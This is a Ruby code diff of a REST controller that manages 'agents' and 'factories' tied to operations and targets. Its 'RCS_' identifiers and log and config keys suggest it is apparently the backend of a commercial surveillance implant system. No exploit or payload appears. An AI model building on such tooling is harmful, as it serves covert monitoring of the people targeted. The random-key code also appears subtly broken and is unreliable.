@@ -17,10 +17,10 @@ class AgentController < RESTController
     filter ||= {}
 
     mongoid_query do
-      items = ::Item.agents.where(filter)
-        .any_in(_id: @session[:accessible])
-        .only(:name, :desc, :status, :_kind, :path, :stat, :type, :platform, :uninstalled)
-
+      items = ::Item.where(filter)
+        .any_in(_id: @session[:accessible], _kind: ['agent', 'factory'])
+        .only(:name, :desc, :status, :_kind, :path, :stat, :type, :ident, :platform, :uninstalled)
+        
       ok(items)
     end
   end
@@ -30,10 +30,10 @@ class AgentController < RESTController
     
     mongoid_query do
       item = Item.agents
-        .any_in(_id: @session[:accessible])
-        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :instance, :platform, :upgradable, :uninstalled, :deleted, :demo, :type, :version)
+        .any_in(_id: @session[:accessible], _kind: ['agent', 'factory'])
+        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :instance, :platform, :upgradable, :uninstalled, :deleted, :demo, :type, :version, :counter, :configs)
         .find(@params['_id'])
-
+      
       ok(item)
     end
   end
@@ -44,7 +44,7 @@ class AgentController < RESTController
     updatable_fields = ['name', 'desc', 'status']
     
     mongoid_query do
-      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
       
       @params.delete_if {|k, v| not updatable_fields.include? k }
       
@@ -56,13 +56,13 @@ class AgentController < RESTController
                     :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
         end
       end
-
+      
       item.update_attributes(@params)
       
       return ok(item)
     end
   end
-
+  
   def destroy
     require_auth_level :tech
     
@@ -78,35 +78,101 @@ class AgentController < RESTController
       return ok
     end
   end
-
- def add_config
+  
+  def create
     require_auth_level :tech
 
+    # to create a target, we need to owning operation
+    return bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'
+    return bad_request('INVALID_TARGET') unless @params.has_key? 'target'
+
     mongoid_query do
-      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
 
-      # the config was not sent, replace it
-      if agent.configs.last.sent.nil? or agent.configs.last.sent == 0
-        @params.delete('_id')
-        agent.configs.last.update_attributes(@params)
-        config = agent.configs.last
-      else
-        config = agent.configs.create!(config: @params['config'], desc: @params['desc'])
+      operation = ::Item.operations.find(@params['operation'])
+      return bad_request('INVALID_OPERATION') if operation.nil?
+
+      target = ::Item.targets.find(@params['target'])
+      return bad_request('INVALID_TARGET') if target.nil?
+
+      # used to generate log/conf keys and seed
+      alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'
+
+      item = Item.create!(desc: @params['desc']) do |doc|
+        doc[:_kind] = :factory
+        doc[:path] = [operation._id, target._id]
+        doc[:status] = :open
+        doc[:ident] = get_new_ident
+        doc[:name] = @params['name']
+        doc[:name] ||= doc[:ident]
+        doc[:counter] = 0
+        seed = (0..11).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
+        seed.setbyte(8, 46)
+        doc[:seed] = seed
+        doc[:confkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
+        doc[:logkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
+        doc[:configs] = []
       end
+      
+      @session[:accessible] << item._id
+      
+      Audit.log :actor => @session[:user][:name],
+                :action => "factory.create",
+                :operation => operation['name'],
+                :target => target['name'],
+                :agent => item['name'],
+                :desc => "Created factory '#{item['name']}'"
 
-      config.saved = Time.now.getutc.to_i
-      config.user = @session[:user][:name]
-      config.save
+      item = Item.factories
+        .only(:name, :desc, :status, :_kind, :path, :ident, :counter, :configs)
+        .find(item._id)
 
+      ok(item)
+    end
+  end
+
+  def get_new_ident
+    global = ::Item.where({_kind: 'global'}).first
+    global ||= ::Item.new({_kind: 'global', counter: 0}).save
+    global.inc(:counter, 1)
+    "RCS_#{global.counter.to_s.rjust(10, "0")}"
+  end
+
+  def add_config
+    require_auth_level :tech
+    
+    mongoid_query do
+      agent = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
+
+      @params['desc'] ||= ''
+      
+      case agent._kind
+        when 'agent'
+          # the config was not sent, replace it
+          if agent.configs.last.sent.nil? or agent.configs.last.sent == 0
+            @params.delete('_id')
+            agent.configs.last.update_attributes(@params)
+            config = agent.configs.last
+          else
+            config = agent.configs.create!(config: @params['config'], desc: @params['desc'])
+          end
+          
+          config.saved = Time.now.getutc.to_i
+          config.user = @session[:user][:name]
+          config.save
+        when 'factory'
+          agent.configs.delete_all
+          config = agent.configs.create!(config: @params['config'], user: @session[:user][:name], saved: Time.now.getutc.to_i)
+      end
+      
       Audit.log :actor => @session[:user][:name],
                 :action => "#{agent._kind}.add_config",
                 agent._kind.to_sym => @params['name'],
                 :desc => "Saved configuration for agent '#{agent['name']}'"
-
+      
       return ok(config)
     end
   end
-
+  
   def del_config
     require_auth_level :tech
 
